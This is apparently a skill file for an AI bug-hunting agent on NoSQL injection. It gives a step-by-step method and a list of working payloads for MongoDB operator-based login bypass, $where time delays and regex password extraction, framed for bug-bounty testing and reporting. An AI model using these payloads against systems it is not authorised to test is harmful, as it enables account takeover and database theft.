---
skill: nosql-injection
title: "NoSQL Injection"
category: "Security · Web"
load_when: "nosql injection, mongodb injection, nosqli, operator injection, $ne, $gt, $where, json injection auth bypass"
pack: SUPERAGENT V10
bughunt: true
---

# NoSQL Injection

## Where it pays
Modern stacks (MongoDB, CouchDB, Firebase) often pass JSON straight into queries. Auth bypass and data extraction are common and high-impact.

## Attack-surface signals
JSON APIs, login forms backed by Mongo/Couch, search/filter endpoints, anything taking `{"user":...,"pass":...}`, GraphQL resolvers over NoSQL, query params that become document filters.

## Methodology
1. **Auth bypass via operators:** replace a value with an operator object — `{"user":"admin","pass":{"$ne":null}}` or `{"$gt":""}`.
2. **In URL-encoded form:** `user[$ne]=x&pass[$ne]=x` (PHP/Express array parsing).
3. **`$where` / JS injection:** `{"$where":"sleep(5000)"}` for blind/time-based.
4. **`$regex` extraction:** brute the password char-by-char with `{"pass":{"$regex":"^a"}}`.
5. **`$gt`/`$lt` boolean blind:** infer values via true/false responses.
6. **Type juggling:** send arrays/objects where a string is expected to change query semantics.

## Payloads / probes
```
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":"admin","password":{"$gt":""}}
username[$ne]=x&password[$ne]=x
{"$where":"sleep(5000)"}
{"password":{"$regex":"^a"}}
{"username":{"$in":["admin","root"]}}
```

## Root causes
Untrusted input used as a query object · body parser allows nested objects/arrays · `$where`/mapReduce with user JS · no type enforcement on query fields.

## Validation gate
Show auth bypass (logged in as another/any user), data extraction beyond your account, or a controlled time delay via `$where`.

## Impact & chains
Auth bypass → account takeover · blind extraction → full DB dump · `$where` JS → sometimes RCE. Chains with api/rest-authz and auth/session.

## 🧪 Try it locally
```bash
python3 ../../../tools/payload_gen.py nosql
python3 ../../../tools/skill_router.py "nosql injection mongodb auth bypass"
```

→ Report with `../reporting/writeup.md` (CWE-943); validate with `../reporting/validation-gate.md`.
